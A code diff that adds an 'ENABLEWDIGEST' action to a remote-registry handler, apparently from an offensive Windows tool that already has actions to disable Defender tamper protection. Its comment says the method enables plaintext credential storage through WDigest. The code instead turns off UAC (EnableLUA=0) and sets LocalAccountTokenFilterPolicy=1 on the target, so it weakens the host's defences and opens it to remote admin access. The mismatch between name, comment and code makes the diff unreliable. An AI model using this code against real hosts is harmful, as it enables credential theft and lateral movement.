@@ -172,6 +172,8 @@ class RegHandler:
                 self.disableTamper(dce)
             elif self.__action == 'CHECKTAMPER':
                 self.checkTamper(dce)
+            elif self.__action == 'ENABLEWDIGEST':
+                self.enableWDIGEST(dce)
             else:
                 logging.error('Method %s not implemented yet!' % self.__action)
 
@@ -503,3 +505,38 @@ class RegHandler:
             self.logger.highlight('TamperProtection = 5  (its on)   ')
         else:
             self.logger.highlight('TamperProtection = {}  (less than 5 is good)'.format(tp_value))
+
+    def enableWDIGEST(self, dce):
+        # Flips the HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential value to 1
+        # next time users logon it stores the creds in plaintext. 
+        try:
+            ans = rrp.hOpenLocalMachine(dce)
+            regHandle  = ans['phKey']
+        except Exception as e:
+            logging.debug('Exception thrown when hOpenLocalMachine: %s', str(e))
+            return
+
+        try:
+            resp = rrp.hBaseRegCreateKey(dce, regHandle , 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System')
+            keyHandle = resp['phkResult']
+        except Exception as e:
+            logging.debug('Exception thrown when hBaseRegCreateKey: %s', str(e))
+            return
+
+        # EnableLUA
+        try:
+            resp = rrp.hBaseRegSetValue(dce, keyHandle, 'EnableLUA\x00',  rrp.REG_DWORD, 0)
+            self.logger.highlight('EnableLUA Key Set!')
+        except Exception as e:
+            logging.debug('Exception thrown when hBaseRegSetValue EnableLUA: %s', str(e))
+            self.logger.error('Could not set EnableLUA Key')
+            pass
+
+        # LocalAccountTokenFilterPolicy
+        try:
+            resp = rrp.hBaseRegSetValue(dce, keyHandle, 'LocalAccountTokenFilterPolicy\x00',  rrp.REG_DWORD, 1)
+            self.logger.highlight('LocalAccountTokenFilterPolicy Key Set!')
+        except Exception as e:
+            logging.debug('Exception thrown when hBaseRegSetValue LocalAccountTokenFilterPolicy: %s', str(e))
+            self.logger.error('Could not set LocalAccountTokenFilterPolicy Key')
+            return
